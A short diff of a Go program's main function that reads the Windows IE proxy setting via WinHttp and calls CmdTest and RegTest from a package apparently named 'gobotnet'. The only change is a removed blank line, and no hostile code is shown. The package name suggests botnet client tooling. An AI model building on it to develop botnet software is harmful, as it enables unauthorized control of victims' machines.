@@ -82,7 +82,6 @@ func CStringToString(cs CString) (s string) {
 func main() {
 	fmt.Println(GetIEProxyFromWinHttp())
 	defer syscall.FreeLibrary(winhttpdll)
-
 	gobotnet.CmdTest()
 	gobotnet.RegTest()
 }
